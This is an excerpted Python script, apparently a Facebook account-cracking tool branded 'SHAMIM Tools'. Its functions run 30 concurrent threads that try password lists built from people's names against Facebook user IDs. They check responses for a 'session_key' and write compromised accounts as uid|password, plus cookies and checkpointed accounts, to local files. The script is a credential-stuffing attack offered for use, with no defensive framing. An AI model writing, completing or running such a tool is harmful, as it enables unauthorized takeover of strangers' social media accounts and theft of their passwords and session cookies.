# Orignally Written By SHAMIM Khan
...
os.system("clear")
print('\n\033[1;32m Loading SHAMIM Tools...')
...
os.system('xdg-open https://www.facebook.com/groups/609221392931083/?ref=share_group_link')
...
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  SHAMIM SARKAR
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  SHAMIM SARKAR
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  SARKAR
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as SHAMIM:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				SHAMIM.submit(api1,ids,names,passlist)
			else:
				SHAMIM.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as SHAMIM:
		...
		for psx in user:
			...
			SHAMIM.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[SHAMIM]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[SHAMIM-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SHAMIM_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SHAMIM_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [SHAMIM-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'SHAMIM-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[SHAMIM-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [SHAMIM-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'SHAMIM_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
